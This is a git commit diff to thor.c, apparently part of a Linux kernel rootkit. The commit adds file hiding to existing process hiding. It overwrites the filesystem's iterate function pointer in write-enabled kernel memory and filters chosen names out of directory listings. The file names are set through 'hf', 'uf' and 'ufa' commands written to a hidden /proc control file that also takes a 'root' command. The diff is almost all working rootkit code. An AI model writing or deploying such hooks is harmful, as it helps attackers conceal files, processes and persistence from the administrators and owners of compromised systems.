c689a6f6a27676a273a58330b022b936af823210
Franz-Josef Haider <f_haider@gmx.at>
2014-11-19 16:58:49 +0100

    implement file hiding support. also move code from thor_cleanup to prochidder_cleanup

--- thor.c
+++ thor.c
@@ -22,6 +22,9 @@
 static int __init thor_init(void);
 static int __init procfile_init(void);
 static int __init prochidder_init(void);
+static int __init filehidder_init(void);
+static void prochidder_cleanup(void);
+static void filehidder_cleanup(void);
 static void __exit thor_cleanup(void);
 static int procfile_open(struct inode *inode, struct file *file);
 static int procfile_read(struct seq_file *m, void *v);
@@ -29,11 +32,20 @@ static ssize_t procfile_write(struct file *file, const char __user *buffer, size
 static void procfile_cleanup(void);
 static int thor_proc_iterate(struct file *file, struct dir_context *ctx);
 static int thor_proc_filldir(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
+static int thor_fs_iterate(struct file *file, struct dir_context *ctx);
+static int thor_fs_filldir(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
 static void add_to_pid_list(const char *name, unsigned int len);
 static void remove_from_pid_list(const char *name, unsigned int len);
 static void clear_pid_list(void);
+static void add_to_file_list(const char *name, unsigned int len);
+static void remove_from_file_list(const char *name, unsigned int len);
+static void clear_file_list(void);
 // ------------------------------------------------------------ DEFINITIONS
 struct _pid_list {
+    char *name;
+    struct list_head list;
+};
+struct _file_list {
     char *name;
     struct list_head list;
 };
@@ -41,8 +53,11 @@ struct _pid_list {
 static struct proc_dir_entry *procfile;
 static struct proc_dir_entry *procroot;
 static struct file_operations *proc_fops;
+static struct file_operations *fs_fops;
 static int (*orig_proc_iterate)(struct file *, struct dir_context *);
 static int (*orig_proc_filldir)(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
+static int (*orig_fs_iterate)(struct file *, struct dir_context *);
+static int (*orig_fs_filldir)(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
 static struct file_operations procfile_fops = {
     .owner = THIS_MODULE,
     .open = procfile_open,
@@ -52,6 +67,7 @@ static struct file_operations procfile_fops = {
     .release = single_release,
 };
 struct _pid_list pid_list;
+struct _file_list file_list;
 // ------------------------------------------------------------ HELPERS
 static void set_addr_rw(void *addr)
 {
@@ -70,7 +86,7 @@ static void set_addr_ro(void *addr)
 // ------------------------------------------------------------ INIT
 static int __init thor_init(void)
 {
-    if(procfile_init() < 0 || prochidder_init() < 0)
+    if(procfile_init() < 0 || prochidder_init() < 0 || filehidder_init() < 0)
     {
         LOG_ERROR("failed to initialize");
         thor_cleanup();
@@ -109,6 +125,30 @@ static int __init prochidder_init(void)
     return 0;
 }
 
+static int __init filehidder_init(void)
+{
+    struct file *filep_etc;
+
+    filep_etc = filp_open("/etc", O_RDONLY, 0);
+    if(filep_etc == NULL)
+    {
+        LOG_ERROR("could not open /etc");
+        return -1;
+    }
+
+    fs_fops = (struct file_operations*) filep_etc->f_op;
+    filp_close(filep_etc, NULL);
+
+    orig_fs_iterate = fs_fops->iterate;
+    set_addr_rw(fs_fops);
+    fs_fops->iterate = thor_fs_iterate;
+    set_addr_ro(fs_fops);
+
+    INIT_LIST_HEAD(&file_list.list);
+
+    return 0;
+}
+
 // ------------------------------------------------------------ PROCFILE
 static int procfile_read(struct seq_file *m, void *v)
 {
@@ -140,6 +180,18 @@ static ssize_t procfile_write(struct file *file, const char __user *buffer,
     else if(0 == strncmp(buffer, "up", MIN(2, count)))
     {
         remove_from_pid_list(buffer+2, count-2);
+    }
+    else if(0 == strncmp(buffer, "hf", MIN(2, count)))
+    {
+        add_to_file_list(buffer+2, count-2);
+    }
+    else if(0 == strncmp(buffer, "ufa", MIN(3, count)))
+    {
+        clear_file_list();
+    }
+    else if(0 == strncmp(buffer, "uf", MIN(2, count)))
+    {
+        remove_from_file_list(buffer+2, count-2);
     }
     else if(0 == strncmp(buffer, "root", MIN(4, count)))
     {
@@ -178,6 +230,76 @@ static int thor_proc_filldir(void *buf, const char *name, int namelen, loff_t of
     // hide thor itself
     if (0 == strcmp(name, THOR_PROCFILE)) return 0;
     return orig_proc_filldir(buf, name, namelen, offset, ino, d_type);
+}
+
+// ------------------------------------------------------------ FILEHIDE
+static int thor_fs_iterate(struct file *file, struct dir_context *ctx)
+{
+    int ret;
+    // capture original filldir function
+    orig_fs_filldir = ctx->actor;
+    // cast away const from ctx->actor
+    filldir_t *ctx_actor = (filldir_t*)(&ctx->actor);
+    // store our filldir in ctx->actor
+    *ctx_actor = thor_fs_filldir;
+    ret = orig_fs_iterate(file, ctx);
+    // restore original filldir
+    *ctx_actor = orig_fs_filldir;
+    return ret;
+}
+
+static int thor_fs_filldir(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
+{
+    struct _file_list *tmp;
+    // hide specified files
+    list_for_each_entry(tmp, &(file_list.list), list)
+    {
+        if(0 == strcmp(name, tmp->name)) return 0;
+    }
+    return orig_fs_filldir(buf, name, namelen, offset, ino, d_type);
+}
+// ------------------------------------------------------------ FILELIST
+static void add_to_file_list(const char *name, unsigned int len)
+{
+    struct _file_list *tmp;
+
+    tmp = (struct _file_list*)kmalloc(sizeof(struct _file_list), GFP_KERNEL);
+    tmp->name = (char*)kmalloc(len, GFP_KERNEL);
+    memcpy(tmp->name, name, len);
+    tmp->name[len-1] = 0;
+
+    list_add(&(tmp->list), &(file_list.list));
+}
+
+static void remove_from_file_list(const char *name, unsigned int len)
+{
+    struct _file_list *tmp;
+    struct list_head *pos, *q;
+
+    list_for_each_safe(pos, q, &(file_list.list))
+    {
+        tmp = list_entry(pos, struct _file_list, list);
+        if(0 == strncmp(tmp->name, name, len-1))
+        {
+            list_del(pos);
+            kfree(tmp->name);
+            kfree(tmp);
+        }
+    }
+}
+
+static void clear_file_list(void)
+{
+    struct _file_list *tmp;
+    struct list_head *pos, *q;
+
+    list_for_each_safe(pos, q, &(file_list.list))
+    {
+        tmp = list_entry(pos, struct _file_list, list);
+        list_del(pos);
+        kfree(tmp->name);
+        kfree(tmp);
+    }
 }
 
 // ------------------------------------------------------------ PIDLIST
@@ -227,13 +349,8 @@ static void clear_pid_list(void)
 static void __exit thor_cleanup(void)
 {
     procfile_cleanup();
-
-    if(NULL != proc_fops && NULL != orig_proc_iterate)
-    {
-        set_addr_rw(proc_fops);
-        proc_fops->iterate = orig_proc_iterate;
-        set_addr_ro(proc_fops);
-    }
+    prochidder_cleanup();
+    filehidder_cleanup();
 
     clear_pid_list();
 
@@ -245,6 +362,26 @@ static void procfile_cleanup(void)
     if (procfile != NULL) {
         proc_remove(procfile);
         procfile = NULL;
+    }
+}
+
+static void prochidder_cleanup(void)
+{
+    if(NULL != proc_fops && NULL != orig_proc_iterate)
+    {
+        set_addr_rw(proc_fops);
+        proc_fops->iterate = orig_proc_iterate;
+        set_addr_ro(proc_fops);
+    }
+}
+
+static void filehidder_cleanup(void)
+{
+    if(NULL != fs_fops && NULL != orig_fs_iterate)
+    {
+        set_addr_rw(fs_fops);
+        fs_fops->iterate = orig_fs_iterate;
+        set_addr_ro(fs_fops);
     }
 }
 
